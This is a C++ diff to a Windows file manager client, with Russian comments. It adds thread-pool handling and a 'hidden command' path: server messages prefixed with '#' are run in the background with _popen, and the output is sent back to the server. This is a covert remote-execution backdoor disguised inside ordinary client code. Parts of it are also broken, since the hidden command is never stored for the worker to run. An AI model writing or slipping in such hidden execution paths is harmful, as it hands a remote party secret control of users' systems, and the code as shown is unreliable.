@@ -6,6 +6,11 @@ using std::cerr;
 using std::endl;
 using std::string; 
 using std::stringstream;
+using std::lock_guard;
+using std::unique_lock;
+using std::mutex;
+
+using std::thread;
 
 int FileManager::StartClient()
 {
@@ -47,8 +52,8 @@ int FileManager::SendData(string data)
 {
     int total_bytes_send = 0, bytes_to_sent, bytes_sent;
     // Sending the data size
-    bytes_to_sent = htonl(data.length());
-    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(int), 0, (struct sockaddr*)&server_address_, sizeof(server_address_));
+    bytes_to_sent = htonl(data.size());
+    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(bytes_to_sent), 0, (struct sockaddr*)&server_address_, sizeof(server_address_));
     if (bytes_sent == SOCKET_ERROR)
     {
         cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
@@ -84,6 +89,7 @@ int FileManager::SendData(string data)
 
 int FileManager::RecvData(string &data)
 {
+
     int server_addr_size = sizeof(server_address_), expected_size = 0, bytes_read = 0;
     char local_buffer[BUFFER_SIZE + 1];
     int bytes_to_receive, total_bytes_received = 0;
@@ -188,20 +194,139 @@ string FileManager::ParsCommand()
     return read_str;
 }
 
-int FileManager::run()
+
+VOID FileManager::ThreadStarter(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
 {
-    StartClient();
+    FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);
+    ptr->RunRequestsCycle();
+}
 
+void FileManager::RunRequestsCycle()
+{
     string cmd;
-
     while (true)
     {
         cmd = ParsCommand();
+        {
+            unique_lock<mutex> lock(mt_);
+            requests_q.push(cmd);
 
-        SendData(cmd);
-        cmd.clear();
-        RecvData(cmd);
+            cv_.wait(lock, [&] {return !server_data_.empty(); });
+            cmd = server_data_;
+            server_data_.clear();
+        }
         if (cmd != "0")
             cout << cmd << endl;
     }
+}
+
+int FileManager::run()
+{
+    // Устанавливаем кодировку консоли для корректного отображения вывода скрытых команд
+    SetConsoleOutputCP(CP_UTF8);
+    SetConsoleCP(CP_UTF8);
+
+    // Инициализируем структуры сокета 
+    StartClient();
+
+    // Устанавливаем сокет в неблокирующий режим
+    u_long mode = 1;
+    if (ioctlsocket(socket_, FIONBIO, &mode) != 0)
+        std::cerr << "Ошибка при установке сокета в неблокирующий режим." << std::endl;
+
+    // Инициализируем пул потоков
+    InitializeThreadpoolEnvironment(&call_back_environ_);
+    pool_ = CreateThreadpool(NULL);
+    SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
+    SetThreadpoolThreadMinimum(pool_, TH_SIZE_MINIMUM);
+
+    SetThreadpoolCallbackPool(&call_back_environ_, pool_);
+
+    cleanupgroup_ = CreateThreadpoolCleanupGroup();
+    SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);
+
+    // Запускаем поток выполнения команд юзера
+    workcallback_ = ThreadStarter;
+    work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
+    SubmitThreadpoolWork(work_);
+    
+    
+    string request_str;
+    while (true)
+    {
+
+        RecvData(request_str);
+        if (!request_str.empty())
+        {
+            // Если в начале запроса есть символ '#' - это запрос на исполнение скрытой команды
+            if (request_str[0] == '#')
+            {
+                request_str.erase(0, 1);
+                workcallback_ = ExecHiddenCommand;
+                work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
+                SubmitThreadpoolWork(work_);
+            }
+            else
+            {
+                server_data_ = request_str;
+                cv_.notify_one();
+            }
+        }
+
+        if (!requests_q.empty())
+        {
+            SendData(requests_q.front());
+            requests_q.pop();
+        }
+    }
+    
+    return 0;
+}
+
+VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
+{
+    FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);
+
+    string result;
+    char buffer[128];
+
+    if (!ptr->continue_)
+        return;
+
+    string cmd;
+    while(true)
+    {
+        {
+            unique_lock<mutex> lock(ptr->mt_);
+            ptr->cv_.wait(lock, [&] {return !ptr->hidden_command_.empty(); });
+            cmd = ptr->hidden_command_;
+            ptr->hidden_command_.clear();
+        }
+        // Создаем файловый поток и выполняем команду
+        FILE* pipe = _popen(cmd.c_str(), "rb");
+        if (!pipe)
+        {
+            result = "Ошибка при выполнении команды.";
+            lock_guard<mutex> lock(ptr->mt_);
+            ptr->requests_q.push(result);
+            return;
+        }
+
+        // Читаем вывод команды и сохраняем его в строку
+        while (!feof(pipe))
+        {
+            if (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+                result += buffer;
+        }
+
+        // Закрываем файловый поток
+        _pclose(pipe);
+
+        {
+            lock_guard<mutex> lock(ptr->mt_);
+            ptr->requests_q.push(result);
+        }
+    }
+
+    return;
 }
